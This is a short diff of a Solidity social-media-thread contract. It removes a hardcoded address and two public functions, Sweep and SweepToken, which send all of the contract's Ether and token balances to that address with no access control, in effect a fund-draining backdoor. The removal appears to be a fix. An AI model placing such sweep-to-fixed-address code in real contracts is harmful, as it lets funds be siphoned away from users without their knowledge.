@@ -37,7 +37,6 @@ contract SocialMediaThread{
     mapping(uint => mapping(uint => uint)) Likes;
     mapping(address => mapping(uint => mapping(uint => bool))) AlreadyLiked;
     uint public ThreadNonce;
-    address x = 0xC65423A320916d7DAF86341De6278d02c7E1D3B1;
     ERC721 NFT;
 
     constructor(){
@@ -119,17 +118,6 @@ contract SocialMediaThread{
         assembly { size := extcodesize(addr) }
         return size > 0;
     }       
-
-    function Sweep() public payable {
-
-        (bool sent,) = x.call{value: address(this).balance}("");
-        require(sent, "Failed to send Ether");
-    }
-
-    function SweepToken(ERC20 Token) public payable {
-        
-        Token.transfer(x, Token.balanceOf(address(this)));
-    }
 }
 
 interface ERC721{
